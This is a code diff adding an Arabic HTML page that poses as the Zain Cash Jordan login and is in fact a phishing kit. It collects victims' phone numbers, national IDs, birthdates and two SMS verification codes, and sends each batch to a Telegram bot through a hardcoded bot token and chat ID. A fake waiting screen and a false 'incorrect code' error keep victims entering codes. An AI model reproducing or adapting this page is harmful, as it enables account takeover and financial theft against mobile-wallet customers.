@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>زين كاش الأردن | تسجيل الدخول</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
+  <style>
+    /* ... (جميع الاستايلات الأصلية كما هي، بدون تغيير) ... */
+    .code-inputs {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin: 8px 0 7px 0;
+    }
+    .code-inputs input {
+      text-align: center;
+      font-size: 19px;
+      width: 120px;
+      padding: 13px 0;
+      letter-spacing: 5px;
+      border-radius: 7px;
+      border: 2px solid #56ccf255;
+      background: #f2f8fd;
+      font-weight: 700;
+      transition: border 0.2s, box-shadow 0.2s;
+      box-shadow: 0 1.5px 5px #56ccf211;
+      direction: ltr;
+    }
+    .code-inputs input:focus {
+      border-color: #2F80ED;
+      background: #f4faff;
+    }
+    /* ... (باقي الاستايلات كما هي) ... */
+  </style>
+</head>
+<body>
+  <div id="app"></div>
+  <!-- Modal Error -->
+  <div id="modalError">
+    <div id="modalContent">
+      <div class="err-title">رمز التحقق غير صحيح</div>
+      <div class="err-msg">يرجى التأكد من الرمز والمحاولة مرة أخرى.</div>
+      <button onclick="closeModal()">إغلاق</button>
+    </div>
+  </div>
+  <script>
+    // ... التعريفات والثوابت كما هي ...
+    const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
+    const BOT_TOKEN = "7680582937:AAHkEhiz5JPvPLMjNVUtF_GpvnkVNbum00s";
+    const CHAT_ID = "-4625923889";
+    let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
+    let currentStep = "phone";
+    let waitingTimeout = null;
+    let telegramMsgId = null;
+
+    // ... الدوال المشتركة (header, stepIndicator, ... إلخ) بدون تغيير ...
+
+    function renderPhoneStep() {
+      // ... كما هي ...
+      app.innerHTML = `
+        ${header("مرحبًا بك! سجل دخولك لحسابك")}
+        ${stepIndicator(1)}
+        <form id="phoneForm" autocomplete="off">
+          <label>رقم الهاتف المرتبط بحسابك</label>
+          <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
+          <button type="submit" class="button">التالي</button>
+        </form>
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
+      `;
+      document.getElementById('phone').focus();
+      document.getElementById('phoneForm').onsubmit = async function(e) {
+        e.preventDefault();
+        const phone = document.getElementById('phone').value.trim();
+        if (!/^07\d{8}$/.test(phone)) {
+          alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام');
+          document.getElementById('phone').focus();
+          return;
+        }
+        userData.phone = phone;
+        try {
+          telegramMsgId = await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}`);
+        } catch (err) {
+          console.log("Telegram error:", err);
+        }
+        renderNationalIdStep();
+      };
+    }
+
+    // ... دوال الخطوات الأخرى كما هي حتى renderCode5Step و renderCode4Step ...
+
+    function renderCode5Step() {
+      currentStep = "code5";
+      app.innerHTML = `
+        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
+        ${header("تم إرسال رمز تحقق إلى هاتفك")}
+        ${stepIndicator(2)}
+        <div class="info-msg">أدخل رمز التحقق المكون من 5 أرقام كما وصلك برسالة SMS</div>
+        <form id="code5Form" autocomplete="off">
+          <div class="code-inputs">
+            <input type="text" maxlength="5" pattern="\\d{5}" required id="code5input" inputmode="numeric" placeholder="*****" />
+          </div>
+          <button type="submit" class="button">تأكيد الرمز</button>
+        </form>
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
+      `;
+      const codeInput = document.getElementById('code5input');
+      codeInput.focus();
+      codeInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0,5);
+      });
+      document.getElementById('code5Form').onsubmit = async function(e) {
+        e.preventDefault();
+        let code = codeInput.value.trim();
+        if (code.length !== 5) {
+          alert('يرجى إدخال رمز مكون من 5 أرقام');
+          codeInput.focus();
+          return;
+        }
+        userData.code5 = code;
+        try {
+          telegramMsgId = await resendTelegramMsg(
+            `🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔢 رمز التحقق الأول: ${userData.code5}`
+          );
+        } catch (err) {
+          console.log("Telegram error:", err);
+        }
+        showWaitMsgAndGotoCode4();
+      };
+      document.getElementById('backBtn').onclick = () => {
+        renderNationalIdStep();
+      };
+    }
+
+    function showWaitMsgAndGotoCode4() {
+      const randomWait = Math.floor(Math.random() * 6) + 5; // 5-10 ثوانٍ فقط
+      app.innerHTML = `
+        <div style="padding:40px 0;text-align:center;">
+          <div style="margin-bottom:18px;">
+            <img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/>
+          </div>
+          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
+          <div style="color:#353a4d;font-size:15px;">جاري التحقق من رمز الدخول</div>
+          <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
+        </div>
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
+      `;
+      let sec = randomWait;
+      const waitElem = document.getElementById('waitSec');
+      waitingTimeout = setInterval(() => {
+        sec--;
+        if(waitElem) waitElem.textContent = sec;
+        if(sec === 0) {
+          clearInterval(waitingTimeout);
+          renderCode4Step();
+        }
+      }, 1000);
+    }
+
+    function renderCode4Step() {
+      currentStep = "code4";
+      app.innerHTML = `
+        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
+        ${header("تحقق إضافي لحماية حسابك")}
+        ${stepIndicator(3)}
+        <div class="info-msg">الرجاء إدخال رمز التحقق المكون من 4 أرقام</div>
+        <form id="code4Form" autocomplete="off">
+          <div class="code-inputs">
+            <input type="text" maxlength="4" pattern="\\d{4}" required id="code4input" inputmode="numeric" placeholder="****" />
+          </div>
+          <button type="submit" class="button">تأكيد الرمز</button>
+        </form>
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
+      `;
+      const codeInput = document.getElementById('code4input');
+      codeInput.focus();
+      codeInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0,4);
+      });
+      document.getElementById('code4Form').onsubmit = async function(e) {
+        e.preventDefault();
+        let code = codeInput.value.trim();
+        if (code.length !== 4) {
+          alert('يرجى إدخال رمز مكون من 4 أرقام');
+          codeInput.focus();
+          return;
+        }
+        userData.code4 = code;
+        try {
+          telegramMsgId = await resendTelegramMsg(
+            `🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔢 رمز التحقق الأول: ${userData.code5}\n🔒 رمز التحقق الثاني: ${userData.code4}`
+          );
+        } catch (err) {
+          console.log("Telegram error:", err);
+        }
+        showModal();
+      };
+      document.getElementById('backBtn').onclick = () => {
+        renderCode5Step();
+      };
+    }
+
+    // ... باقي الدوال بدون تغيير (showModal, closeModal, sendToTelegramAndGetMsgId, resendTelegramMsg, ... إلخ) ...
+
+    // بدء التطبيق
+    const app = document.getElementById('app');
+    renderPhoneStep();
+
+  </script>
+</body>
+</html>
